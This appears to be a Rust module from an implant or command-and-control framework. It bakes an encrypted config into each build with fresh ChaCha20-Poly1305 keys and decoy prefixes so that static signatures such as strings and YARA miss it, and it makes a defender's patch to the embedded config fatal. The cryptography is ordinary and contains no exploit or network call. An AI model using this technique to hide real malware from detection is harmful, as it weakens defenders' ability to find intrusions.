//! Per-build encrypted implant config — runtime half.
//!
//! [`nyx_config_macros::embed!`] reads a config file at **compile time**,
//! encrypts it with a fresh random ChaCha20-Poly1305 key+nonce and a random
//! decoy prefix, and emits a call to [`decrypt`] that returns the plaintext at
//! runtime. Every build (and every call site) bakes a different key/nonce/offset,
//! so the static config bytes — and the surrounding instruction layout — differ
//! per build.
//!
//! ⚠ SECURITY: this is obfuscation, NOT confidentiality. The decryption key is
//! embedded in the same binary as the ciphertext and is recoverable by a reverse
//! engineer; the per-build randomization only defeats naive static signatures
//! (`strings`, simple YARA), not a determined analyst. Do not rely on `embed!`
//! to keep sensitive config values secret.
//!
//! Why AEAD (not bare stream): config-in-binary is integrity-sensitive (a
//! defender patching the embedded config should fail the Poly1305 tag), so we
//! reuse the same ChaCha20-Poly1305 the beacon loop already trusts.
//!
//! ## Features
//! - `std` (default): enables [`encrypt`] (needs `rand`/`OsRng`). Used by the
//!   proc-macro at build time and by tests.
//! - `no_std`: drops [`encrypt`] and the `rand` dep, leaving only [`decrypt`]
//!   (needs just `chacha20poly1305` + `alloc`). Used by the `#![no_std]` PIC
//!   implant, which only ever decrypts a config baked at build time.

#![cfg_attr(feature = "no_std", no_std)]

extern crate alloc;

use alloc::vec::Vec;

use chacha20poly1305::{
    aead::{Aead, Payload},
    ChaCha20Poly1305, KeyInit, Nonce,
};

pub const KEY_LEN: usize = 32;
pub const NONCE_LEN: usize = 12;

/// Encrypt `plain` under a freshly generated key+nonce. Returns
/// `(key, nonce, ciphertext_with_tag)`. Used by the proc-macro at compile time
/// (and by tests). Requires the `std` feature (OsRNG via `getrandom`).
#[cfg(feature = "std")]
pub fn encrypt(plain: &[u8]) -> ([u8; KEY_LEN], [u8; NONCE_LEN], Vec<u8>) {
    use rand::RngCore;
    let mut key = [0u8; KEY_LEN];
    rand::rngs::OsRng.fill_bytes(&mut key);
    encrypt_with_key(plain, key)
}

/// Encrypt `plain` under a caller-supplied `key` with a fresh per-call OsRng
/// `nonce`. Returns `(key, nonce, ciphertext_with_tag)`. The nonce is always
/// freshly drawn (nonce reuse under a fixed key would be catastrophic), so
/// repeated calls with the same key produce different ciphertext.
///
/// Used by `build.rs` and the proc-macro when `NYX_CONFIG_KEY` supplies an
/// operator-chosen 32-byte key. The ciphertext format is identical to
/// [`encrypt`] and is decrypted by the same [`decrypt`] path. Requires the
/// `std` feature.
#[cfg(feature = "std")]
pub fn encrypt_with_key(
    plain: &[u8],
    key: [u8; KEY_LEN],
) -> ([u8; KEY_LEN], [u8; NONCE_LEN], Vec<u8>) {
    use rand::RngCore;
    let mut nonce = [0u8; NONCE_LEN];
    rand::rngs::OsRng.fill_bytes(&mut nonce);
    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(&key));
    let ct = cipher
        .encrypt(
            Nonce::from_slice(&nonce),
            Payload {
                msg: plain,
                aad: b"",
            },
        )
        .expect("chacha20poly1305 encrypt is infallible");
    (key, nonce, ct)
}

/// Decrypt config baked by [`encrypt`] / `embed!`. Panics on tag mismatch —
/// in practice all material is baked at compile time, so a failure means
/// tampering and the implant should treat it as fatal. Available in both the
/// `std` and `no_std` feature builds.
pub fn decrypt(key: &[u8; KEY_LEN], nonce: &[u8; NONCE_LEN], ciphertext: &[u8]) -> Vec<u8> {
    let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key));
    cipher
        .decrypt(
            Nonce::from_slice(nonce),
            Payload {
                msg: ciphertext,
                aad: b"",
            },
        )
        .expect("nyx config: decrypt failed (tampered embedded config?)")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn roundtrip() {
        let (k, n, ct) = encrypt(b"hello config");
        assert_eq!(decrypt(&k, &n, &ct), b"hello config");
    }

    #[test]
    fn ciphertext_is_real_and_key_bound() {
        let (k1, n1, ct1) = encrypt(b"same");
        let (k2, n2, ct2) = encrypt(b"same");
        assert_ne!(ct1, b"same".to_vec(), "ciphertext must not equal plaintext");
        assert_ne!(ct1, ct2, "per-call key randomizes the ciphertext");
        assert_eq!(decrypt(&k1, &n1, &ct1), b"same");
        assert_eq!(decrypt(&k2, &n2, &ct2), b"same");
        // Wrong key must fail (AEAD integrity).
        let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(&k2));
        assert!(cipher
            .decrypt(
                Nonce::from_slice(&n1),
                Payload {
                    msg: &ct1[..],
                    aad: b""
                }
            )
            .is_err());
    }

    #[test]
    fn roundtrip_large_config() {
        let plain = (0..4096).map(|i| (i & 0xff) as u8).collect::<Vec<_>>();
        let (k, n, ct) = encrypt(&plain);
        assert_eq!(decrypt(&k, &n, &ct), plain);
    }

    #[test]
    fn encrypt_with_key_keeps_key_and_uses_fresh_nonce() {
        let plain = b"operator-supplied key config";
        let key = [0x11u8; KEY_LEN];
        let (k_out, n1, ct1) = encrypt_with_key(plain, key);
        // The caller's key is returned verbatim.
        assert_eq!(k_out, key);
        // Round-trips through the shared decrypt path.
        assert_eq!(decrypt(&k_out, &n1, &ct1), plain);

        // Same key, fresh nonce → different ciphertext (nonce is not reused).
        let (_k2, n2, ct2) = encrypt_with_key(plain, key);
        assert_ne!(n1, n2, "nonce must be fresh per call");
        assert_ne!(ct1, ct2, "fresh nonce under fixed key must re-randomize ct");
        assert_eq!(decrypt(&key, &n2, &ct2), plain);
    }
}
